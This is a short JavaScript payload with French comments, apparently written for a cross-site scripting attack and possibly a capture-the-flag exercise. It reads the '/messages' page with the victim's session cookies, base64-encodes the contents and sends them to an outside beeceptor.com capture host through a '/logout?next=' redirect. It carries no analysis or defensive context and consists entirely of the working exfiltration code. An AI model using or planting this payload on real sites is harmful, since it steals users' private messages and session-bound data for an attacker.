fetch("/messages", {
  method: "GET",
  credentials: "include"
})
  .then(r => {
    if (!r.ok) throw new Error("HTTP " + r.status);
    return r.text();
  })
  .then(txt => {
    // succès → encode le contenu et redirige
    const encoded = btoa(txt);
    document.location = "/logout?next=https://skavens.free.beeceptor.com/" + encoded;
  })
  .catch(err => {
    console.error(err);
    // échec → redirige vers /error
    document.location = "/logout?next=https://skavens.free.beeceptor.com/error";
  });
